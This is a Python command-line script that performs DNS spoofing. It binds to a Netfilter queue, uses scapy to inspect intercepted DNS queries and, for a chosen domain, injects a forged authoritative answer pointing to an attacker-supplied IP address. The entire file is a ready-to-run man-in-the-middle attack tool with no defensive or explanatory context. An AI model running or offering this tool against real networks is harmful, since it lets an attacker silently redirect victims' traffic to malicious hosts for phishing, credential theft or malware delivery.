#!/usr/bin/python

from scapy.all import *
from netfilterqueue import NetfilterQueue
import argparse
import sys
import os


def dnsSpoof(packet):
    originalPayload = IP(packet.get_payload())

    if not originalPayload.haslayer(DNSQR):
        # Not a dns query, accept and go on
        packet.accept()

    if not urlToSpoof in originalPayload[DNS].qd.qname:
        # DNS query but not for target urlToSpoof, accept and go on
        packet.accept()
    else:
        # DNS query for target urlToSpoof, let's spoof it

        print("Intercepted DNS request for {}: {}".format(
            urlToSpoof, originalPayload.summary()))

        # Build the spoofed response using the original payload, we only change the "rdata" portion
        spoofedPayload = IP(dst=originalPayload[IP].dst, src=originalPayload[IP].src) /\
            UDP(dport=originalPayload[UDP].dport, sport=originalPayload[UDP].sport) /\
            DNS(id=originalPayload[DNS].id, qr=1, aa=1, qd=originalPayload[DNS].qd,
                an=DNSRR(rrname=originalPayload[DNS].qd.qname, ttl=10, rdata=spoofToIP))

        print("Spoofing DNS response to: {}".format(spoofedPayload.summary()))
        packet.set_payload(str(spoofedPayload))
        packet.accept()
        print("------------------------------------------")

parser = argparse.ArgumentParser()
parser.add_argument('-q', required=True,
                    metavar='Netfilter Queue ID for binding')
parser.add_argument('-s', required=True,
                    metavar='url to spoof/ip_address')
parser.add_argument('-d', required=True,
                    metavar='destination ip_address')
args = parser.parse_args()

urlToSpoof  = str(args.s)
spoofToIP = str(args.d)
queueId = int(args.q)

nfqueue = NetfilterQueue()
nfqueue.bind(queueId, dnsSpoof)

try:
    print("Spoofing {} to {}".format(urlToSpoof, spoofToIP))
    print("------------------------------------------")
    nfqueue.run()
except KeyboardInterrupt:
    pass
